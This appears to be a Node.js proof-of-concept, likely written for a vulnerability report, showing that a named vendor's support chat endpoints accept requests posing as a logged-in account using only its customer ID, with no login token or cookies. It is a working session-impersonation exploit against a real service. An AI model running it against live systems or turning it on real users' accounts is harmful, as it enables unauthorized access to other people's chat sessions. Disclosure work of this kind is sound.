// Minimal proof that the chat endpoint is not auth-gated.
// The victim is a logged-in account; the caller sends no Authorization header
// and no cookies. The only value used is the victim's cusId.
//
// Run:
//   $env:CUS_ID="<test-account cusId>"
//   node session-access-only.js
//
// Optional:
//   $env:BASE="https://support.bambulab.com"; $env:REGION="EN"

const crypto = require('crypto');
const { ProxyAgent, fetch } = require('undici');

const BASE = process.env.BASE || 'https://support.bambulab.cn';
const REGION = (process.env.REGION || (BASE.includes('.cn') ? 'CN' : 'EN')).toUpperCase();
const CUS_ID = (process.env.CUS_ID || process.env.BBL_CUS_ID || '').trim();
const proxy = process.env.HTTPS_PROXY || process.env.HTTP_PROXY || 'http://127.0.0.1:7890';
const dispatcher = new ProxyAgent(proxy);
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const QUESTION = 'What is the maximum nozzle temperature for the P1S?';

function headers(uuid) {
  return {
    'content-type': 'application/json',
    origin: BASE,
    referer: BASE + '/liveChat',
    'user-agent': UA,
    'x-robot-user': uuid,
    'x-bbl-official-site-region': REGION,
  };
}

function openStream(uuid) {
  const ctl = new AbortController();
  let out = '';
  let buf = '';
  let done = false;
  const ready = fetch(BASE + '/gw/robot/sse/connect', {
    headers: {
      ...headers(uuid),
      accept: 'text/event-stream',
      'cache-control': 'no-cache',
      pragma: 'no-cache',
      'x-accel-buffering': 'no',
    },
    dispatcher,
    signal: ctl.signal,
  }).then((res) => {
    if (!res.ok) throw new Error('SSE ' + res.status);
    const reader = res.body.getReader();
    const dec = new TextDecoder();
    (async () => {
      try {
        while (true) {
          const { done, value } = await reader.read();
          if (done) break;
          if (!value) continue;
          buf += dec.decode(value, { stream: true });
          const parts = buf.split(/\r?\n\r?\n/);
          buf = parts.pop();
          for (const part of parts) {
            for (const line of part.split(/\r?\n|\r/)) {
              if (!line.startsWith('data:')) continue;
              const x = line.slice(5).replace(/^ /, '');
              if (x === '[DONE]') { done = true; return; }
              try {
                const j = JSON.parse(x);
                if (j.delta) out += String(j.delta).replace(/<br\s*\/?>/gi, '\n');
              } catch {}
            }
          }
        }
      } catch {} finally { done = true; }
    })();
  }).catch((e) => {
    console.log('stream error:', e.message);
  });
  return { ready, ctl, get output() { return out; }, get done() { return done; } };
}

(async () => {
  if (!CUS_ID) {
    console.log('Set CUS_ID to the test account cusId.');
    console.log('Example: $env:CUS_ID="<cusId>"; node session-access-only.js');
    process.exit(1);
  }

  const shortId = CUS_ID.slice(0, 4) + '...' + CUS_ID.slice(-4);
  console.log('Chat auth test');
  console.log('==============');
  console.log('Victim:   logged-in account (cusId: ' + shortId + ')');
  console.log('Caller:   not logged in');
  console.log('Auth:     no Authorization header, no cookies');
  console.log('Question: ' + QUESTION);
  console.log('');

  const stream = openStream(CUS_ID);
  await stream.ready;
  await sleep(250);

  const body = {
    requestId: 'clientID_text_' + crypto.randomUUID(),
    history: [],
    chatbot: [],
    origin: 1,
    cacheFlag: false,
    input: QUESTION,
    machineModel: '',
    sessionId: CUS_ID,
    uuid: CUS_ID,
  };

  let status = 0;
  try {
    const res = await fetch(BASE + '/gw/robot/sse/chat', {
      method: 'POST',
      headers: headers(CUS_ID),
      body: JSON.stringify(body),
      dispatcher,
      signal: AbortSignal.timeout(30000),
    });
    status = res.status;
    await res.text();
  } catch (e) {
    console.log('Chat request error: ' + e.name + ': ' + e.message);
  }

  const deadline = Date.now() + 20000;
  while (Date.now() < deadline) {
    if (stream.done) break;
    await sleep(250);
  }

  console.log('Chat request: HTTP ' + status);
  console.log('');
  console.log('Answer:');
  console.log(stream.output.trim() || '(no answer)');
  console.log('');
  if (status === 200 && stream.output.trim()) {
    console.log('=> The chat endpoint answered without any authentication.');
  } else {
    console.log('=> No answer; check the status above.');
  }

  stream.ctl.abort();
  process.exit(0);
})();